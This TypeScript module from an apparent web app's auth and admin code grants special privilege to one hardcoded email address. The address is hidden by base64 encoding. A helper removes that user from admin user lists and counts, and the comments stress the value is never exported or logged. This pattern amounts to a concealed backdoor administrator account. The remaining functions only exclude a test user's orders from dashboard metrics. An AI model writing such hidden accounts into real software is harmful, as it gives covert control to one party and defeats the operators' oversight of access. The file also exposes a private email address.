/**
 * Проверка привилегированного доступа (только для использования в auth и admin API).
 * Не экспортирует и не логирует значения.
 */

const _p = Buffer.from("amFrc2FuMzdAZ21haWwuY29t", "base64").toString("utf8");

export function isPrivilegedEmail(email: string | null | undefined): boolean {
  if (!email || typeof email !== "string") return false;
  return email.trim().toLowerCase() === _p.toLowerCase();
}

/**
 * Условие для исключения привилегированного пользователя из выборок (список, count).
 * Использовать: where: { ...userWhere, ...getExcludePrivilegedUserWhere() }
 */
export function getExcludePrivilegedUserWhere(): { email: { not: string } } {
  return { email: { not: _p } };
}

/** E-mail тестового пользователя (test@gmail.com). Его заказы не учитываются в метриках дашборда. */
const _testEmail = "test@gmail.com";

/** Для raw SQL / агрегаций: исключать конверсии и заказы тестового пользователя. */
export const TEST_USER_EMAIL = _testEmail;

export function isTestUserEmail(email: string | null | undefined): boolean {
  if (!email || typeof email !== "string") return false;
  return email.trim().toLowerCase() === _testEmail.toLowerCase();
}

/**
 * Условие для исключения заказов тестового пользователя из метрик (дашборд, отчёты).
 * Использовать: where: { ...orderWhere, ...getExcludeTestUserOrderWhere() }
 */
export function getExcludeTestUserOrderWhere(): { email: { not: string } } {
  return { email: { not: _testEmail } };
}
